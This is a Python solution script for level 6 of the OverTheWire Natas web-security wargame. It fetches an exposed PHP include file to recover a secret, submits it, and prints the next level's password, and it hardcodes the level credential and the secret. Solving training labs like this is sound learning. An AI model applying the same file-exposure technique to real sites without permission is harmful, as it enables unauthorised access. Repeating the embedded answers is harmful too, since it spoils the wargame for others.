#!/usr/bin/python3

import requests
import re

level = 6
username = 'natas%s' % level
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'
url = 'http://%s.natas.labs.overthewire.org/' % username

# First request testing
response = requests.get(url, auth=(username, password))

# This takes us to an input button asking for us to submit a post request - try viewing the source code
source_response = requests.get(url + 'index-source.html', auth=(username, password))

# This returns some PHP source code - if we print the file that is included we get the 'secret'
secret_response = requests.get(url + 'includes/secret.inc', auth=(username, password))

# Now that we have the secret, generate a POST request and see what comes back
post_params = {'secret':'FOEIUWGHFEEUHOFUOIU', 'submit':'Submit+Query'}
post_response = requests.post(url, auth=(username, password), data=post_params)

# That should do it - now print the password
password = re.findall('The password for natas%s is (.*)' % str(level+1), post_response.text)[0]
print(password)

